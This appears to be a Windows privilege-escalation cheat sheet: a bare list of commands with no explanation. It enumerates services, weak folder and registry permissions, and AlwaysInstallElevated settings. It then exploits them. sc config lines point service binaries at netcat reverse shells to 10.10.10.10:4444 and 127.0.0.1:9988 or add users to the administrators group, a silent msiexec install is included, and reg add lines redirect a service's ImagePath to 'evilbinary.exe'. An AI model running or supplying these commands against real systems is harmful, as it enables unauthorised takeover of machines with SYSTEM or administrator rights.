```

wmic process get ProcessID,ExecutablePath
gwmi win32_process | select Handle, CommandLine | format-list
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users John %username%"
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) (WX) :\" 
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) (WX) :\" | findstr ":\ everyone authenticated users John %username%"

accesschk64.exe -uwcqv "Authenticated Users" * /accepteula
accesschk64.exe -uwcqv %USERNAME% * 
accesschk64.exe -uwcqv "BUILTIN\Users" * 
accesschk64.exe -uwcqv "John" * 


icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "Everyone"
icacls "C:\Program Files\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
icacls "C:\Program Files (x86)\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users" 


reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i C:\Users\public.INFERNO\test.msi



systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe get Caption,Description,HotFixID,InstalledOn

sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
sc config <Service_Name> binpath= "cmd \c "net localgroup administrators it\itemployee35 /add"
sc.exe create newsvc35 obj= LocalSystem binpath= "net localgroup administrators John /add" start= auto

#Insecure Registry Permissions
get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "John Users Path Everyone"
accesschk64.exe "authenticated users" –kvuqsw hklm\System\CurrentControlSet\services
accesschk64.exe -kvuqsw  hklm\System\CurrentControlSet\services
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\WeakService4" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\MeMe\Desktop\evilbinary.exe" /f

```
